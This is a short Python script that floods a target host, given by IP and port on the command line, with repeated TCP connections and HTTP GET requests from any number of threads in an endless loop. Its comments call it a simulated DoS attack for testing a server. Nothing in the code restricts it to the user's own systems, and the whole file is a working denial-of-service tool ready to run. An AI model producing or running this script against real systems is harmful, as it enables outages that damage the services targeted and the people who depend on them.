import socket
import sys
import threading

# Target IP and Port (Replace with the server you're testing)
TARGET_IP = str(sys.argv[1])  # Localhost or test server IP
TARGET_PORT = int(sys.argv[2])  # Port where the server is listening

# Number of threads to simulate multiple connections
NUMBER_OF_THREADS = int(sys.argv[3])

# Function to create a flood of connections and send data
def attack():
    while True:
        try:
            # Create a new TCP connection
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((TARGET_IP, TARGET_PORT))

            # Send a large number of requests or random data
            message = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(TARGET_IP)
            sock.send(message.encode('utf-8'))
            sock.close()
        except socket.error as e:
            # Print the error if the server is not responding
            print(f"Connection error: {e}")
        except Exception as e:
            # Catch any other exceptions and print the reason
            print(f"An unexpected error occurred: {e}")

# Creating multiple threads to simulate a DoS attack
def start_attack():
    for i in range(NUMBER_OF_THREADS):
        thread = threading.Thread(target=attack)
        thread.start()

if __name__ == "__main__":
    start_attack()
